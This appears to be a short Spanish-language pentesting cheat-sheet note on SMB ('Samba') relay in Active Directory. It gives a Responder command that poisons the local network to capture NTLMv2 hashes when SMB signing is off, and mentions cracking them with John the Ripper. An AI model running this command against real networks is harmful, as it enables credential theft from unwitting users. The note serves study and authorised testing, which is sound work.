# Samba Relay 

Tags: #SambaRelay #ActiveDirectory

* [Responder-Samba-Relay](https://github.com/SpiderLabs/Responder/blob/master/Responder.conf)

```python 
❯ python3 Responder.py -I eth0 -rdw           # Comando para iniciar el ataque y envenenar la red

	# Conseguirmos conseguir el Hash 'NTLMv2' ya que Samba no esta firmado, esto se hace en IPV4
	# Los Hashes los podemos crackear con 'John the Ripper' 
```